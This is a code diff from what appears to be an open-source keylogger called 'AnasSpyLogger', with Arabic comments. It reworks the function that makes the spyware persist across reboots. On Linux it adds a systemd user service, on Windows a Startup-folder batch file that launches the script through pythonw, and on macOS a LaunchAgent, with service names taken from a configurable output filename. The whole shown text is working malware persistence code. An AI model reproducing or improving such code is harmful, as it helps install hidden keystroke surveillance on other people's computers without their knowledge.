@@ -139,25 +139,39 @@ def start_logger():
 
 # ===== حفظ البرنامج في الخلفية =====
 
-def persist_script():
+def persist_script(output_filename):
     system = platform.system()
 
     if system == "Linux":
         print("[*] System: Linux - Setting up systemd service...")
+
         user_service_path = os.path.expanduser("~/.config/systemd/user")
         os.makedirs(user_service_path, exist_ok=True)
 
-        service_file_path = os.path.join(user_service_path, "anaspylogger.service")
-        script_dir = os.path.dirname(os.path.abspath(__file__))
+        # اسم الخدمة بناءً على اسم الملف
+        service_name = os.path.splitext(output_filename)[0] + ".service"
+        service_file_path = os.path.join(user_service_path, service_name)
+
+        # المسار الكامل للسكربت
+        script_path = os.path.abspath(output_filename)
+
+        # نسخ config.py إلى ~/.config/systemd/user/
+        config_source = os.path.join(os.getcwd(), "config.py")
+        config_destination = os.path.join(user_service_path, "config.py")
+        if os.path.exists(config_source):
+            with open(config_source, "r") as src_file:
+                with open(config_destination, "w") as dst_file:
+                    dst_file.write(src_file.read())
+            print(f"[+] config.py copied to: {config_destination}")
 
         service_content = f"""[Unit]
-Description=AnasSpyLogger Persistence Service
+Description=AnasSpyLogger Persistence Service for {output_filename}
 After=network.target
 
 [Service]
 Type=simple
-WorkingDirectory={script_dir}
-ExecStart=/usr/bin/python3 {os.path.join(script_dir, "anaskeylogger.py")}
+WorkingDirectory={os.path.dirname(script_path)}
+ExecStart=/usr/bin/python3 {script_path}
 Restart=always
 RestartSec=10
 
@@ -175,45 +189,35 @@ WantedBy=default.target
         subprocess.run(["systemctl", "--user", "daemon-reload"])
 
         # تفعيل وتشغيل الخدمة
-        subprocess.run(["systemctl", "--user", "enable", "anaspylogger.service"])
-        subprocess.run(["systemctl", "--user", "start", "anaspylogger.service"])
+        subprocess.run(["systemctl", "--user", "enable", service_name])
+        subprocess.run(["systemctl", "--user", "start", service_name])
 
-        print("[+] Service enabled and started.")
-
-
-        # إعادة تحميل الخدمات الخاصة بالمستخدم
-        subprocess.run(["systemctl", "--user", "daemon-reload"])
-
-        # تفعيل وتشغيل الخدمة
-        subprocess.run(["systemctl", "--user", "enable", "anaspylogger.service"])
-        subprocess.run(["systemctl", "--user", "start", "anaspylogger.service"])
-
-        print("[+] Service enabled and started.")
+        print(f"[+] Service {service_name} enabled and started.")
 
     elif system == "Windows":
         print("[*] System: Windows - Setting up Startup script...")
         startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
-        target_path = os.path.join(startup_folder, "AnasSpyLogger.bat")
+        target_path = os.path.join(startup_folder, f"{output_filename}.bat")
         with open(target_path, 'w') as f:
-            f.write(f"@echo off\nstart pythonw {os.path.abspath(__file__)}\n")
+            f.write(f"@echo off\nstart pythonw {os.path.abspath(output_filename)}\n")
 
     elif system == "Darwin":
         print("[*] System: macOS - Setting up Launch Agent...")
         launch_agents_path = os.path.expanduser("~/Library/LaunchAgents")
         os.makedirs(launch_agents_path, exist_ok=True)
 
-        plist_file_path = os.path.join(launch_agents_path, "com.anasspylogger.plist")
+        plist_file_path = os.path.join(launch_agents_path, f"com.{os.path.splitext(output_filename)[0]}.plist")
 
         plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
         <plist version="1.0">
         <dict>
             <key>Label</key>
-            <string>com.anasspylogger</string>
+            <string>com.{os.path.splitext(output_filename)[0]}</string>
             <key>ProgramArguments</key>
             <array>
                 <string>/usr/bin/python3</string>
-                <string>{os.path.abspath(__file__)}</string>
+                <string>{os.path.abspath(output_filename)}</string>
             </array>
             <key>RunAtLoad</key>
             <true/>
@@ -228,6 +232,7 @@ WantedBy=default.target
         subprocess.run(["launchctl", "load", plist_file_path])
 
         print(f"[+] Launch Agent created: {plist_file_path}")
+
 
 # ===== تشغيل البرنامج بشكل دائم =====
 def run_every_hour():
